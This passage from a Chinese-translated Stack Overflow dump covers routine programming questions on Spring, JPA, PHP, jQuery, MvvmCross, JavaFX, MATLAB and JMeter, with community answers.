    parent.fullName = ko.computed(function(){
        return parent.firstName() + " " + parent.lastName();
    });
    return parent;
  },
  'children': {
     create: function(options) {
         options.data.description = ko.computed(function(){
             return options.data.name + " is " + options.data.age + " years old ";
         });
         return ko.mapping.fromJS(options.data);         
     }
   }
};

viewModel = ko.mapping.fromJS(data, mapping);

ko.applyBindings(viewModel); 
```

# java - 从 ServletContext 资源 [/WEB-INF/applicationContext.xml] 解析 XML 文档时出现意外异常；

> ID：15526419
> 
> 赞同：0
> 
> 时间：2013-03-20T14:31:02.300
> 
> 标签：java, spring, spring-security, pom.xml

在我的 pom.xml 中，我收到以下错误。我拥有的原因`<version>2.0.3</version>`是使用 Spring 2 NTLM 身份验证。

```
org.springframework.beans.factory.BeanDefinitionStoreException: 
Unexpected exception parsing XML document from
 ServletContext resource [/WEB-INF/applicationContext.xml]; nested exception
is java.lang.NoSuchMethodError:org.springframework.aop.config.AopNamespaceUtils.
 registerAutoProxyCreatorIfNecessary(Lorg/springframework/beans
/factory/xml/ParserContext;Lorg/w3c/dom/Element;)V 
```

如果我添加以下内容。

```
<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-security-core</artifactId>
    <version>2.0.3</version>
</dependency>
<dependency>
     <groupId>org.springframework.security</groupId>
     <artifactId>spring-security-core-tiger</artifactId>
     <version>2.0.3</version>
</dependency>
<dependency>
     <groupId>org.springframework.security</groupId>
     <artifactId>spring-security-ntlm</artifactId>
     <version>2.0.3</version>
</dependency>
<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-security-taglibs</artifactId>
    <version>2.0.3</version>
</dependency> 
```

我`pom.xml`没有上述没有错误

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 
          http://maven.apache.org/maven-v4_0_0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>test</groupId>
    <artifactId>app</artifactId>
    <packaging>war</packaging>
    <version>1.0-SNAPSHOT</version>
    <name>app</name>
    <url>http://maven.apache.org</url>
    <repositories>
        <repository>
            <id>prime-repo</id>
            <name>PrimeFaces Maven Repository</name>
            <url>http://repository.primefaces.org</url>
            <layout>default</layout>
        </repository>
    </repositories>
    <properties>
        <spring.version>3.1.1.RELEASE</spring.version>
        <spring.security.version>2.0.2\. RELEASE</spring.security.version>
    </properties>
    <dependencies>
        <!-- Spring 3 dependencies -->

        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>${spring.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-context</artifactId>
            <version>${spring.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-web</artifactId>
            <version>${spring.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-tx</artifactId>
            <version>${spring.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-orm</artifactId>
            <version>${spring.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-test</artifactId>
            <version>${spring.version}</version>
        </dependency>
        <!-- JSF library -->
        <dependency>
            <groupId>com.sun.faces</groupId>
            <artifactId>jsf-api</artifactId>
            <version>2.1.6</version>
        </dependency>
        <dependency>
            <groupId>com.sun.faces</groupId>
            <artifactId>jsf-impl</artifactId>
            <version>2.1.6</version>
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>jstl</artifactId>
            <version>1.2</version>
        </dependency>
        <!-- Primefaces library -->
        <dependency>
            <groupId>org.primefaces</groupId>
            <artifactId>primefaces</artifactId>
            <version>3.4.2</version>
        </dependency>
        <dependency>
            <groupId>org.primefaces.themes</groupId>
            <artifactId>afterwork</artifactId>
            <version>1.0.8</version>
        </dependency>
        <!-- Hibernate library -->
        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-core</artifactId>
            <version>4.1.0.Final</version>
        </dependency>
        <dependency>
            <groupId>javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.12.1.GA</version>
        </dependency>
        <dependency>
            <groupId>javax.inject</groupId>
            <artifactId>javax.inject</artifactId>
            <version>1</version>
        </dependency>
        <!-- Oracle Java Connector library -->
        <dependency>
            <groupId>com.oracle</groupId>
            <artifactId>ojdbc6</artifactId>
            <version>11.2.0.3</version>
        </dependency>
        <dependency>
            <groupId>c3p0</groupId>
            <artifactId>c3p0</artifactId>
            <version>0.9.1.2</version>
        </dependency>
        <!-- Log4j library -->
        <dependency>
            <groupId>log4j</groupId>
            <artifactId>log4j</artifactId>
            <version>1.2.16</version>
        </dependency>
        <dependency>
            <groupId>org.testng</groupId>
            <artifactId>testng</artifactId>
            <version>6.4</version>
        </dependency>
        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-jpamodelgen</artifactId>
            <version>1.2.0.Final</version>
        </dependency>
        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-entitymanager</artifactId>
            <version>4.1.0.Final</version>
        </dependency>
        <dependency>
            <groupId>org.hibernate.javax.persistence</groupId>
            <artifactId>hibernate-jpa-2.0-api</artifactId>
            <version>1.0.1.Final</version>
        </dependency>
        <dependency>
            <groupId>org.apache.myfaces.extensions.cdi.core</groupId>
            <artifactId>myfaces-extcdi-core-api</artifactId>
            <version>1.0.5</version>
            <scope>compile</scope>
        </dependency>
        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-ehcache</artifactId>
            <version>4.0.1.Final</version>
        </dependency>
        <dependency>
            <groupId>p6spy</groupId>
            <artifactId>p6spy</artifactId>
            <version>1.3</version>
        </dependency>
    </dependencies>
    <build>
        <resources>
            <resource>
                <directory>src/main/resources</directory>
            </resource>
        </resources>

        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <configuration>
                    <source>1.6</source>
                    <target>1.6</target>
                    <compilerArgument>-proc:none</compilerArgument>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.bsc.maven</groupId>
                <artifactId>maven-processor-plugin</artifactId>
                <version>2.0.6</version>
                <executions>
                    <execution>
                        <id>process</id>
                        <goals>
                            <goal>process</goal>
                        </goals>
                        <phase>generate-sources</phase>
                        <configuration>
                            <!-- source output directory -->
                            <outputDirectory>target/metamodel</outputDirectory>
                        </configuration>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
</project> 
```

**编辑 1**

根据 PSR 的建议，添加以下依赖项时会发生错误

```
<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-security-core</artifactId>
    <version>2.0.3</version>
</dependency> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:40:22.900

问题会因为其中一个依赖而出现。尝试首先删除所有依赖项。然后尝试一个一个添加，然后我们可以找出问题所在

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-02-08T04:31:02.840

在您的类路径中检查 spring jar 的多个版本。我们在类路径中有 spring-dao 和 spring-tx。删除 spring-dao 固定问题。

# c++ - 通过地图/矩阵将地形图与河流不相交？

> ID：15526420
> 
> 赞同：1
> 
> 时间：2013-03-20T14:31:04.120
> 
> 标签：c++, algorithm, game-engine, game-physics

我有一个简单的矩阵（矩阵，它代表 2d 游戏中的地形图，包含 ASCII 字符，例如“m”代表山，“v”代表山谷，“r”代表河流）并且在地图上可能有一条或没有一条河流。河流可以从矩阵的任何位置流向任何位置（并且总是在两个不同的部分上分开地图=>地图上不可能有河流的来源，总是在一端进入并存在于另一端）。如果存在河流，如何在两个集群上分离矩阵/地形图？

示例地形

```
v v v v v v v v r v v v v v 
v v v v v m m m r m m m m m
v v v v v m m r r m m m m m
m m v m m m m r r m m m v v 
v v v v v v r r v v v v v v 
```

在这里，我应该得到不是河流的坐标的左簇和右簇。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T14:39:09.993

您应该尝试查找填充算法。 [http://en.wikipedia.org/wiki/Flood_fill](http://en.wikipedia.org/wiki/Flood_fill)

基本上你想选择一个不在河流中的点，启动洪水填充算法，它会给你一组连接到起点的点。这样一来，您现在就拥有了一个零件，并且从现在开始就很容易找到那个零件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:55:42.487

您的地图会产生一个图表：

*   每个地图单元格都有一个顶点
*   如果两个顶点相邻**并且**它们都不是“r”，则它们是连接的

构建图后，您可以运行图遍历算法，如[广度优先搜索](http://en.wikipedia.org/wiki/Breadth-first_search)(BFS) 或[深度优先搜索](http://en.wikipedia.org/wiki/Depth-first_search)(DFS) 来查找图的[连通分量](http://en.wikipedia.org/wiki/Connected_component_%28graph_theory%29)。

我建议使用 BFS，因为如果映射很大，那么 DFS 可能会让你陷入堆栈溢出（如果使用它的递归实现）。

您将只想在非“r”节点上运行 BFS，这样最终您将得到两个连接的组件。

# javascript - 如何在不害怕的情况下更新 JavaScript 库？

> ID：15526423
> 
> 赞同：1
> 
> 时间：2013-03-20T14:31:10.787
> 
> 标签：javascript, jquery, web-applications, lightbox, bxslider

在最近的历史中，作为一名 Web 开发人员的一件伟大的事情就是所有正在发生的共享，尤其是 JavaScript 库。有所有这些很棒的工具可供使用：jQuery、jQuery-UI、Lightbox、bxslider、underscore.js、Backbone.js，不胜枚举。然后有一段时间需要更新这些库中的一个或多个。但是 JavaScript 在客户端上运行，它不会编译，并且当出现问题时很难或不可能得到通知。**现在最好的技术是什么，以确保在您更新一个或多个 JavaScript 库后，您的 Web 应用程序不会开始抛出 JavaScript 错误？**

对此，最好的回应绝不是只进行测试。尤其是对于一个复杂的应用程序，要检查每一种可能性并确保没有错误被抛出是非常困难的。其他 Web 应用程序开发人员正在做些什么来确保他们的部署不存在由更新引起的令人尴尬和严重的 JavaScript 错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:47:32.897

最好的答案是“只是测试”。本质上，您要问的是“我如何测试以确保我的软件仍然有效？”。你可以做所有你想看看有什么变化的作业，但**最终你只需要测试你的应用程序**。

话虽如此，有[JSLint](http://jslint.com)和[Selenium](http://seleniumhq.com)等通用测试工具，但**最终您的应用程序将**足够独特，以至于您需要进行单元测试来涵盖非标准流程的业务逻辑和标准 QA。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:36:24.397

我不会真正称其为“只是测试”，但单元测试将有助于完成这项工作。为您的应用程序编写一次测试以寻找预期结果（无论哪种方式都是好的做法），然后在您更新插件时再次运行这些测试。

[http://qunitjs.com/](http://qunitjs.com/)

不过，没有什么能比得上好的 QA 和浏览器测试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:34:37.207

确保事情仍然正常工作的一种方法是在开发环境中运行一套自动化的浏览器测试（使用像 Selenium 这样的工具）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T15:03:03.903

许多其他答案已经包括“测试”，所以希望在这一点上很明显。

您应该始终做的另一件事是阅读每个版本的发行说明，直到您要升级到的版本。我不能明智地谈论 bxslider 或 Lightbox，但是您引用的其他主要库非常擅长发布详细的更改日志，这些更改日志会通知您重大更改。您可以自行决定这些更改是否会对您的应用程序产生负面影响（当然除了测试！）。

# spring-mvc - SpringMVC 表单：选项项目属性：它到底期待什么？

> ID：15526425
> 
> 赞同：12
> 
> 时间：2013-03-20T14:31:12.963
> 
> 标签：spring-mvc, jstl

我仍然是 SpringMVC 的新手（以及 jstl ）。我正在尝试从对象列表的选择中填充选项。我找到了一种使用 c:forEach 的方法，但我一直认为必须有一种方法可以使 form:options 方法起作用。

我已经浏览过，关于 items 属性的官方文档我能找到的最接近的东西在这里>> [http://static.springsource.org/spring/docs/2.0.x/reference/spring-form.tld .html#spring-form.tld.options](http://static.springsource.org/spring/docs/2.0.x/reference/spring-form.tld.html#spring-form.tld.options)

它说 items 属性用于

> “用于生成内部‘选项’标签的集合、映射或对象数组”

我的困惑是它正在寻找什么样的集合、映射或对象数组。他们需要采用什么格式？它是专门寻找 String 类型的 Collection 或数组吗？我可以用吗

```
List<MyObject> 
```

如果是这样，MyObject 必须包含什么才能使其有效（即方法、变量）？

目前，当我尝试使用 MyObject 时，我得到一个异常，上面写着 -

> ConverterNotFoundException：找不到能够从 com.example.MyObject 类型转换为 java.lang.String 类型的转换器

我需要做一个转换器吗？那会去哪里？那将如何运作？我已经用谷歌搜索了那个错误消息，并没有真正找到任何特定于我正在尝试做的事情......（大多数是关于 Roo 的结果）

MyObject 类如下所示：

```
public class MyObject{
    private String company;
    private Customer customer;
    private Address customerAddress;

    public String getCompany() {
        return company;
    }

    public void setCompany(String company) {
        this.company = company;
    }

    public Customer getCustomer() {
        return customer;
    }

    public void setCustomer(Customer customer) {
        this.customer = customer;
    }

    public Address getCustomerAddress() {
        return customerAddress;
    }

    public void setCustomerAddress(Address customerAddress) {
        this.customerAddress = customerAddress;
    }
} 
```

我正在尝试这样使用它：

```
<form:select path="myObjectList">
    <form:option value="0"/>
    <form:options items="myObjectList" /> 
</form:select> 
```

有谁知道这个方法有什么不正确的？或者，我应该使用

```
List<String> 
```

完成我正在做的事情？

**编辑**这里的堆栈跟踪>> [http://pastebin.com/2c5XBCmG](http://pastebin.com/2c5XBCmG)

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-03-20T16:29:26.210

[Spring 文档](http://static.springsource.org/spring/docs/3.2.x/spring-framework-reference/html/view.html)说明了标签的`items`属性：`form:options`

> items 属性通常由项目对象的集合或数组填充。itemValue 和 itemLabel 仅引用这些项目对象的 bean 属性（如果指定）；否则，项目对象本身将被字符串化。或者，您可以指定一个项目映射，在这种情况下，映射键被解释为选项值，映射值对应于选项标签。如果同时指定了 itemValue 和/或 itemLabel，则 item value 属性将应用于 map 键，而 item label 属性将应用于 map value。

简而言之，如果您需要使用自定义 Bean 的列表作为 items 属性，您还需要使用`itemValue`and`itemLabel`属性。就个人而言，我更喜欢使用 Maps（`LinkedHashMap`特别是实例）来填充我的选择标签，但这只是个人喜好问题。

改编 Spring 文档中的示例，您的代码应如下所示：

```
 <form:select path="commandAttribute">
      <form:option value="-" label="--Please Select"/>
      <form:options items="${countryList}" itemValue="company" itemLabel="company"/>
 </form:select> 
```

我将`company`属性用作`itemValue`and `itemLabel`，但您可以自由选择符合您要求的属性。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T16:17:07.000

通常我用这样的弹簧标签来做：

```
<springform:select path="myObjectList" id="selected_company">
    <springform:option value="0" label="--- Select One ---"></springform:option>
    <springform:options items="${myObjectList}" itemValue="company" itemLabel="company"></springform:options>
</springform:select> 
```

不要忘记包括命名空间声明：xmlns:springform="http://www.springframework.org/tags/form"

# xamarin.ios - mvvmcross 中的海关绑定交叉视图

> ID：15526429
> 
> 赞同：4
> 
> 时间：2013-03-20T14:31:17.723
> 
> 标签：xamarin.ios, mvvmcross

我需要一个自定义绑定，我知道何时何地，但我不知道该怎么做。这是我的自定义绑定中视图的关系。想想像控件一样的*视图。 ![在此处输入图像描述](../Images/a1900738f00c98c705f64d8a134de35d.png)

我有来自 ViewModel->ContainerView->FirstView 的连接，但我无法将它与 TableView 连接。为了将 ContainerView 连接到 FirstView，我做了一个自定义绑定（目前是一个方向）。在 setvalue 方法中，我调用了 firstview 的方法 SetBinding（我想在其中进行绑定）

我尝试了几个选项，但没有任何反应，最后一个看起来像这样：

```
public GolferList CurrentGolferList { get; set; }
    public void SetBinding(GolferList golferList){
        this.CurrentGolferList = golferList;

        TableSource = new TableSourcePlayers(TableViewPlayers);
        var bindingDescription = new[]{
            new MvxBindingDescription {TargetName = "ItemsSource",SourcePropertyPath = "CurrentGolferList"} ,
        };

        Binder.Bind(this,TableSource, bindingDescription);

        TableViewPlayers.Source = TableSource;
        TableViewPlayers.ReloadData();

    } 
```

如果您能告诉我另一种处理方法，我将不胜感激。

**更新**：我关注了 Stuart 的链接，现在它工作正常，非常感谢 Stuart！实际上，在我的方案中，TableView 是一个 MvxSimpleBindableTableViewSource，我想在那里绑定数据。所以为了让它工作，我使用了下面的代码（SetBinding 需要一些外部重构）：

```
 private List<IMvxUpdateableBinding> bindings;
    private string BindingText = "{'ItemsSource':{'Path':'CurrentGolfers'}}";
   public object DataContext { 
        get { return dataContext; }
        set { dataContext = value;
            if (bindings == null)
                bindings = this.GetService<IMvxBinder>().Bind(dataContext, TableSource, BindingText).ToList();
            else
                bindings.ForEach(b => b.DataContext = dataContext);
           }
        }
    public void SetBinding(GolferList golferList){
        this.DataContext = PlayViewModel;
        tableView.Source = TableSource;
        tableView.ReloadData();
   } 
```

请注意，BindingText 指向表，而不是视图本身。

**更新 2** 现在在 V3 中有点不同。首先，视图必须实现 IMvxBindable 和这个成员：

```
 public object DataContext
    {
        get { return BindingContext.DataContext; }
        set { BindingContext.DataContext = value; }
    }

    public IMvxBindingContext BindingContext { get; set; } 
```

（不要忘记调用 BindingContext.ClearAllBindings() 并在 viewload 中调用 CreateBindingContext() ）

然后你就可以在你的课堂上绑定了。就我而言：

```
 var set = this.CreateBindingSet<FirstPlayViewController, PlayViewModel>();
    set.Bind(source).To(vm => vm.CurrentGolfers).Apply(); //I love the new fluent api :) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T15:50:23.190

我认为您想要做的是实际的数据绑定视图，而不是自定义绑定。

这个问题涵盖了这一点 - [MvvmCross Touch 项目中的自定义可绑定控件](https://stackoverflow.com/questions/15073262/custom-bindable-control-in-a-mvvmcross-touch-project)

基本上，您需要做的是将“Bindings”和“DataContext”属性的集合添加到您的`FirstView`.

如果你这样做，那么你应该能够在 FirstView 中进行数据绑定（到 DataContext），就像在任何普通的 MvvmCross 视图中一样。

注意 - 这在 v3 中会更容易做到，因为我们添加了一个 'BindingContext' 对象来帮助这种类型的操作

# php - 根据变量值更改php echo语句中的字体颜色

> ID：15526432
> 
> 赞同：0
> 
> 时间：2013-03-20T14:31:27.400
> 
> 标签：php, html

我正在使用 PHP 将 MySQL 数据库中的数据提取到网页上的表中。这很好用，但我想根据变量的值更改某些输出的字体。

输出代码如下所示：

```
<td><font face="Arial, Helvetica, sans-serif"><?php echo $variable; ?></font></td> 
```

如果 $variable 的值小于 0，我想将字体更改为红色。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:34:59.083

试试这个：

```
<td><span style="font-family:Arial, Helvetica, sans-serif;<?php if($variable<0)echo "color:red"?>"><?php echo $variable; ?></span></td> 
```

请注意，该`<font>`标签很久以前就已弃用，因此我将其替换为`<span>`标签。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:36:10.203

从 HTML 4.01 开始，该`FONT`标签已被弃用，您应该改用 CSS。

排队：

```
<td style='color:red;'><?php echo $variable; ?></td> 
```

CSS：

```
.tdRed{
color:red;
}

<td class='tdRed'><?php echo $variable; ?></td> 
```

*编辑：*

要使用某个变量自动更改它，您可以将其包含在：

```
<td <?php if($variable == 'something'){ php?>class='tdRed'<?php } php?>><?php echo $variable; ?></td> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:34:46.477

我的 PHP 有点生疏，但这里是一般的想法：

```
<td><font face="<? if ($variable == [whatever]){ ?>Arial, Helvetica, sans-serif" <? else if ($variable == [whatever]) {?> Unicorn Font <? } ?> ><?php echo $variable; ?></font></td> 
```

所以用`unicorn font`你想要的任何字体替换。

**或者，正如我刚刚意识到的，如果你想让它变成红色：**

```
<? $color = $variable < 0 : "red" ? ""> ?>
<td><font><span style="font-family: Arial, Helvetica, sans-serif; color:<? echo $color ?>"><?php echo $variable; ?></span></td> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T14:34:52.387

我不会为此使用`font`标签或内联 css，而是使用类：

```
<td class="font_class <?php echo ($variable < 0) ? 'alert' : ''; ?>><?php echo $variable; ?></td> 
```

在你的 CSS 中：

```
.font_class {
  font-family: Arial, Helvetica, sans-serif;
}
.alert {
  color: red;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T14:34:59.603

`if`在`font`标签内嵌入一个

```
<font face="Arial, Helvetica, sans-serif" <?php if ($variable < 0): ?>color="red"<?php endif; ?>><?php echo $variable; ?></font> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-20T14:35:09.220

实现这一点的最佳方法是在 PhP 中使用 CSS 和测试值

HTML/PhP 看起来像：

```
<td<?php if($variable<0) echo 'class="subzero"'; ?>><?php echo $variable; ?></td> 
```

和CSS：

```
td.subzero {color : #FF0000;} 
```

顺便说一下，你的字体也应该在 css 中设置

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-20T14:35:53.443

```
<td style="font face='Arial, Helvetica, sans-serif;' <?php if($variable == 0){echo "font-color:red;"} ?> ">
<?php echo $variable; } ?>
</td> 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-03-20T14:38:07.850

如果您知道 $variable 可能呈现的所有结果，那么也可以使用 Switch 语句而不是 IF 语句。在有很多可预测结果的情况下使用开关会更好。

亚当92

# jquery - Jquery UI 10.2 自动完成

> ID：15526433
> 
> 赞同：0
> 
> 时间：2013-03-20T14:31:29.143
> 
> 标签：jquery, jquery-ui

刚刚将最新版本添加到我的网站，但是我的 .renderitem 打破了“未捕获的类型错误：无法设置未定义的属性 '_renderItem'”

我是否认为它已被替换\或有什么解决方法？

```
 $(function() {
                $("#MainSearch").autocomplete({
                        source: "@Url.Action("ClientSearch","Schedule")",
                        minLength: 3,
                        select: function(event, ui) {

                            $("#MainSearch").val(ui.item.ClientName);
                            $("#mainSearchId").val(ui.item.ClientId);

                            return false;
                        }
                    }
                ).data("autocomplete")
                    ._renderItem = function(ul, client) {
                        return $("<li></li>")
                            .data("item.autocomplete", client)
                            .append("<a>" + client.FullName + "</a>")
                            .appendTo(ul);
                    };

            }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:58:27.067

解决方案是重命名

```
.data("uiAutocomplete") 
```

# javascript - 使用 AJAX 访问 WSDL 的问题

> ID：15526436
> 
> 赞同：0
> 
> 时间：2013-03-20T14:31:40.140
> 
> 标签：javascript, jquery, ajax, database, wsdl

我是 AJAX 新手，正在尝试通过以下代码访问我们的 WSDL 数据库。当我运行它时，Firefox 调试器显示“[10:27:42.805] ReferenceError: $ is not defined @ [http://newsite.wrapcompliance.org/ajaxtest.html:14](http://newsite.wrapcompliance.org/ajaxtest.html:14) ”：想法？

```
<h3>jQuery Test</h3>

<script type="text/javascript">

function callService()
{
    $.ajax
    ({
        url: "http://newsite.wrapcompliance.org/FactoriesWS.wsdl",
        type: "POST",
        dataType: "xml",
        data: {"countryCd":"BGD"},
        contentType: "text/xml; charset=\"utf-8\"",
        success: onSuccess,
        error: onError
    });

    return false;
}

function onSuccess(data, status)
{
    alert("It worked!!");
}

function onError(request, status, error)
{
    alert("It didn't work!!!");
}

</script>

<form method="post" action="">
    <input type="button" value="Do it now!!" onclick="callService(); return false"/>
    </form>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:35:34.973

您的错误是实际上没有 jQuery 存在的结果。我查看了您的示例站点，jquery 在 firebug 的 net 选项卡中抛出了 404，这意味着它没有找到。确保它指向正确的本地目录。目前它正在查看[http://newsite.wrapcompliance.org/jquery-1.9.1.min.js](http://newsite.wrapcompliance.org/jquery-1.9.1.min.js)

也就是说，调用 wsdl 本身很可能会返回 wsdl 的 xml 摘要页面，而不是公开的服务。我建议将暴露的 wsdl 端点包装在 restful 服务中。我已经多次使用 WebAPI RESTful 服务完成了这项工作，而且总能从头疼中解脱出来。

# hibernate - JPA2.0 & Hibernate：使用父实体合并删除子表行（从父子实体集中删除条目）

> ID：15526440
> 
> 赞同：2
> 
> 时间：2013-03-20T14:31:46.073
> 
> 标签：hibernate, jpa-2.0

我正在将 JPA2.O 与 Hibernate 一起使用。我在用户和地址之间有一对多的关系，并且我对这种关系有以下配置：

```
cascade = CascadeType.ALL, fetch = FetchType.LAZY, 
```

例如，我在数据库表中有以下条目：

**用户表**

```
Column: UserID | UserName
row1:    User1 | UserName 
```

**地址表**

```
Column: AddressId| UserID | Address    

row1:   Address1 | User1  | Actual Address

row2:   Address2 | User1  | Actual Address 
```

我可以通过 userId 使用 find 来获取用户实体：

```
User user = entityManager.find(User.class, userId); 
```

并且还可以使用 user.getAddresses() 获取答案。getAddressess() 的代码如下：

```
public class User{
    @OneToMany(cascade = CascadeType.ALL, fetch = FetchType.LAZY, mappedBy = "user")
    public Set<Address> getAddresses() {
       return this.addresses;
    }
} 
```

现在我正在尝试做的是获取一组地址并删除一个条目。假设我在第一次获得地址 1 和 2 时获取了地址集。我从地址集中删除了地址 2 实体。现在用户实体指向只有 1 个用于地址 1 的条目的集合。

现在，如果我使用以下方法合并用户实体，我认为应该从地址表中删除地址 2 的行。但它没有发生。我是否错过了任何事情，或者这不是一种方法。请建议。

```
entityManager.merge(user); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T07:30:23.627

只是想在我开始工作时添加更多细节。

我用**@OneToMany**关系添加了**orphanRemoval = true ：**

 **```
public class User{
    @OneToMany(cascade = CascadeType.ALL, fetch = FetchType.LAZY, orphanRemoval = true, mappedBy = "user")
    public Set<Address> getAddresses() {
       return this.addresses;
    }
} 
```

更改我的代码后，我重新测试它并得到以下错误：

```
Caused by: org.hibernate.HibernateException: A collection with cascade="all-delete-orphan" was no longer referenced by the owning entity instance: 
```

[此链接](http://www.onkarjoshi.com/blog/188/hibernateexception-a-collection-with-cascade-all-delete-orphan-was-no-longer-referenced-by-the-owning-entity-instance/)帮助我解决了上述问题：

现在我可以从数据库中删除子实体，如果它们与父实体中定义的集合断开连接（删除）。**

# c# - 按字段分组

> ID：15526443
> 
> 赞同：2
> 
> 时间：2013-03-20T14:31:58.267
> 
> 标签：c#, visual-studio-2010, reportviewer, report-viewer2010

我有一个报告，我需要按 PaymentMethod 对项目进行分组，然后在每个组下方显示总计。我右键单击详细信息行并选择`Add group > Adjacent Below`然后选择 PaymentMethod 的分组依据。

您可以看到顶部图片有一行显示将总行与详细行分组，这就是我想要的。底部的图片是我目前得到的。

![这就是分组的外观](../Images/ba6544257937dc37d9e04f053cf7203d.png)

![这是我尝试它时实际分组的方式](../Images/36894176fec2e8a966e41c8ef18d66ef.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:42:18.200

您使用了错误的添加组选项。您应该选择添加组 -> 子组。

# javafx-2 - 如何在cycleCount JavaFX中更改计数之间的时间

> ID：15526457
> 
> 赞同：1
> 
> 时间：2013-03-20T14:32:20.813
> 
> 标签：javafx-2

我有一个无缝代码，其中包括 JavaFX 的 mediaPlayer！我设置了 mediaPlayer.setCycleCounts **(MediaPlayer.INDEFINITE)**并且歌曲总是重复！但是在重复周期之间我有一些小停顿，在 0.5 秒内！如何不间断地进行这个循环？

```
 private File mp3File;
    private Media media;
    private MediaPlayer mediaPlayer;
    private MediaView mediaView;

    public SoundEngine(String mediaFile) {
        mp3File = new File(mediaFile);
        try {
            media = new Media(mp3File.toURI().toURL().toString());
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        mediaPlayer = new MediaPlayer(media);
        mediaView = new MediaView(mediaPlayer);
        mediaPlayer.setCycleCount(MediaPlayer.INDEFINITE);
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T15:16:53.787

我认为您的声音文件在结尾或开头有静音部分。`mediaPlayer.setStartTime(Duration.millies(500))`如果静音部分位于文件的开头，您可以使用它来跳过它。

# matlab - 矩阵乘法的并行程序

> ID：15526459
> 
> 赞同：2
> 
> 时间：2013-03-20T14:32:22.407
> 
> 标签：matlab

我想在 Matlab 中编写一个用于矩阵乘法的并行程序。我试过下面的代码，但我做不到。我不想用 GPU 来做。

```
A = pascal(3);
B = magic(3);
m = 3; n = 3;
par for i = 1:m
    for j = 1:n
        C(i,j) = A(i,:)*B(:,j);
    end
end 
```

如何并行化上述代码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T16:04:11.087

`distributed`数组好吗？

```
d = distributed.rand(1024);
result = d * d; 
```

请注意，MATLAB 的矩阵-矩阵乘法是隐式多线程的，因此比使用`distributed`或`parfor`除非您拥有多台机器（或 GPU）的任何东西都更快。

# android - Android 中是否有 API 可以告诉我当前哪个应用程序正在控制音频通道？

> ID：15526460
> 
> 赞同：1
> 
> 时间：2013-03-20T14:32:23.193
> 
> 标签：android

假设我的媒体播放器在后台播放，我也在 Skype 上通话，现在如果我必须播放语音导航命令，我应该调暗音乐（但不是 Skype）。然后播放公告。我现在可以找到哪些应用程序正在使用音频吗？

# csv - 如何从 JMeter .csv 数据文件轻松创建报告和比较？

> ID：15526462
> 
> 赞同：0
> 
> 时间：2013-03-20T14:32:31.433
> 
> 标签：csv, reporting, jmeter, load-testing

我想我的问题很常见，但我仍然没有找到一个优雅的解决方案。我有一个测试计划，一个线程组是一个测试场景。我在每个线程组中都有侦听器，每个侦听器生成 .csv 数据到他们自己的线程组文件夹中。因此，每个“测试运行”都有一个自己的文件夹，侦听器在其中生成 .csv 数据。

我想从这些 .csv 数据文件轻松创建 Excel 图表，甚至可以将连续运行与同一图表中的另一个进行比较。最后，它是关于从数据中轻松生成图表，并验证不同的应用程序设置如何相互执行。

有什么简单的解决方案吗？我不认为我们都应该创建自己的 .csv 解析器 :) 谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T15:45:47.800

